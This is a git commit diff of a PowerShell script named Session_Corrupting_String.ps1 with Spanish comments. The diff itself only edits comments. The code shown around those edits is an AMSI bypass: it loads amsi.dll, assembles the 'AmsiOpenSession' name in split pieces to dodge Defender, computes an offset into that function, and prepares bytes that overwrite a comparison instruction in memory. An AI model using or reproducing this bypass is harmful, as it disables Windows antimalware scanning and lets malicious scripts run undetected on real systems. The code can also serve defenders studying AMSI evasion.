05dada05c5cefabd155f8c143cb2db075b4ae9e9
MrSquid <47063311+MrSquid25@users.noreply.github.com>
2023-02-22 18:29:33 +0100

    Update Session_Corrupting_String.ps1

--- PowerShell/Session_Corrupting_String.ps1
+++ PowerShell/Session_Corrupting_String.ps1
@@ -16,12 +16,12 @@ public class Class {
 }
 "@
 Add-Type $bypass  #definimos la clase .NET
-$parche64 = [Byte[]](0x81,0x39,0x21,0x57,0x4E,0x50)  #Ensamblador vamos a inyectar. Solo funcional para x64
+$parche64 = [Byte[]](0x81,0x39,0x21,0x57,0x4E,0x50)  #Código ensamblador que se va a inyectar. Solo funcional para x64
 $asd = [Class]::LoadLibrary("amsi.dll") #Cargamos amsi
 Write-Output "[+] Parche $parche64"
 Write-Output "[+] Cambiando  81 39 41 4D 53 49       cmp     dword ptr [rcx], 49534D41h ;"
 Write-Output "[+] 81 39 21 57 4E 50       cmp     dword ptr [rcx], 504E5721h ;"
-$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero
+$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero. Apartado que suele generar detecciones del Defender.
 $a=$punterofuncion.ToInt64() + 10 #Posicion del comando que queremos modificar en memoria. Se calcula restando el puntero de amsiopensession del puntero de este comando
 $punterofuncion = [IntPtr] $a
 $oldProtect = 0
